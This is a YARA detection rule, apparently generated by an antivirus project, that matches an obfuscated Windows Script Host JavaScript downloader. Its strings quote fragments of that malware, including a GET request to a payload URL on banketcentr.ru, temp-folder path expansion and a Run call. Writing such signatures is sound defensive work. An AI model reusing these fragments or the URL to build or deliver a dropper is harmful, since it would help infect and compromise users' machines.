rule sig_20160428_6f6ae36c2b48f807e9557a8273631182 {
  meta:
    description = "datamaliciousorder - file 20160428_6f6ae36c2b48f807e9557a8273631182.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e088429489329df17a10486cc85030236746ab1d371a18d461be01863e08c7c7"

  strings:
    $s1  = "function QnsZlrDvfOhmVdtMsnRjy() {return UsvUlvQerGajPdaOabBcp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "var UsvUlvQerGajPdaOabBcp = function HidOuiQzfQbfRllWsqSeg() {return ResWdkJdzFdrNdiVelNsu[KefKbxCggXwqDadLooJbr](\"WScript\"+\"" ascii
    $s3  = "function LnpHjrWkjZjdUvzSvrAct(AvaNlmMjvZzjWunYusHii, DkaEicBlrGvxXtyOfnVyq){TewQrbGfdLawAbnHitNly = TewQrbGfdLawAbnHitNly * 1; " ascii
    $s4  = "return AvaNlmMjvZzjWunYusHii - DkaEicBlrGvxXtyOfnVyq;};" fullword ascii
    $s5  = "LvkQchRbkYqjZwhBpaLvl[CoxAxhPjbDxeLggYooQgt](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s6  = "var UsvUlvQerGajPdaOabBcp = function HidOuiQzfQbfRllWsqSeg() {return ResWdkJdzFdrNdiVelNsu[KefKbxCggXwqDadLooJbr](\"WScript\"+\"" ascii
    $s7  = "var ResWdkJdzFdrNdiVelNsu = this[\"WScript\"];" fullword ascii
    $s8  = "function OzsOpkLbhEaeIbqGcaYtu(IdjYoxKxhZgtRbwSnvCsn){UsvUlvQerGajPdaOabBcp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function QnsZlrDvfOhmVdtMsnRjy() {return UsvUlvQerGajPdaOabBcp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function OzsOpkLbhEaeIbqGcaYtu(IdjYoxKxhZgtRbwSnvCsn){UsvUlvQerGajPdaOabBcp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s11 = "function NvjZemDpnKwrFceAbcKxf(){return PrkPgiKgyLaeJzmYefXzg + \"\";};" fullword ascii
    $s12 = "if (LvkQchRbkYqjZwhBpaLvl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function LnpHjrWkjZjdUvzSvrAct(AvaNlmMjvZzjWunYusHii, DkaEicBlrGvxXtyOfnVyq){TewQrbGfdLawAbnHitNly = TewQrbGfdLawAbnHitNly * 1; " ascii
    $s14 = "function GflZjjYbdMuqGerBydWmn() {return ((NbhSeyIwvLmySsfOekOkx == true) && (NbhSeyIwvLmySsfOekOkx == XlkEpmQcaJasBkeQviBin)) ?" ascii
    $s15 = "function GflZjjYbdMuqGerBydWmn() {return ((NbhSeyIwvLmySsfOekOkx == true) && (NbhSeyIwvLmySsfOekOkx == XlkEpmQcaJasBkeQviBin)) ?" ascii
    $s16 = "} catch(JdlFtpIijEsbTpdVneUvx){};};" fullword ascii
    $s17 = "var NbhSeyIwvLmySsfOekOkx = false;" fullword ascii
    $s18 = "NbhSeyIwvLmySsfOekOkx = true; " fullword ascii
    $s19 = "}while (PdpWjaHdaDcoSzaSjzQjg);" fullword ascii
    $s20 = "var CpuFuyRxeNilMouPkwLwq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}